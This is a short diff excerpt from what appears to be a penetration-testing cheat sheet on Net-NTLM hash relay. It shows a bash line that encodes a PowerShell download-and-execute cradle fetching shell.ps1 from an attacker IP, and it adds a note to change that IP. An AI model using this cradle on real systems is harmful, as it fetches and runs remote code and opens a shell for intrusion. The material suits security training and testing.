@@ -32,6 +32,7 @@ Relay a captured **Net-NTLM hash** from a machine (e.g. DC or SQL Server) to ano
 ```bash
 echo -n "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.100/shell.ps1')" | iconv -t utf-16le | base64 -w 0; echo
 ```
+- Change the IP at the shell.ps1 file.
 
 **Output:**
 ```
